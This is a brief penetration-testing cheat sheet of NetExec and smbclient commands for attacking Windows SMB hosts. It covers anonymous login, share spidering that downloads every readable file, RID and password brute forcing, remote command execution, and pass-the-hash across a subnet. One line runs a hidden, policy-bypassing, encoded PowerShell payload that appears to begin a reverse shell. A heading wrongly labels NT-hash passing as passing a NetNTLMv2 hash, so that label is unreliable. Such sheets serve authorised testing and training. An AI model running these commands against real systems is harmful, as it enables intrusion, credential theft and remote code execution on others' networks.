# Methodology

## Enumerate

```bash
# Null authentication
nxc smb $IP -u '' -p ''

# Anonymous authentication
nxc smb $IP -u 'a' -p ''

# Enumerate shares
nxc smb $IP -u 'a' -p '' --shares

# Spider all shares, downloading all readable files
nxc smb $IP -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=True OUTPUT_FOLDER=.
# List all files with their respective shares
cat $IP.json | jq '. | map_values(keys)'

# Manually enumerate during spider scan
smbclient //$IP/share

# Brute force usernames through RIDs
nxc smb $IP -u 'a' -p '' --rid-brute 10000

# Brute force discovered users
nxc smb $IP -u users.txt -p users.txt --continue-on-success
```

## Utilize Credentials

```bash
# Check credentials (default to smb)
nxc smb $IP -u username -p 'password'

# Execute commands (default to wmi, then smb)
nxc wmi $IP -u username -p 'password' -x whoami
nxc smb $IP -u username -p 'password' -x whoami
nxc smb $IP -u username -p 'password' -x 'powershell -nop -w hidden -noni -ep bypass -e JABjAGwAaQBlAG4AdAAgAD0AIABO...'

# Pass a NetNTLMv2 hash
nxc smb 192.168.1.0/24 -u username -H 'NTHASH'
nxc smb 192.168.1.0/24 -u username -H 'LM:NT'
```
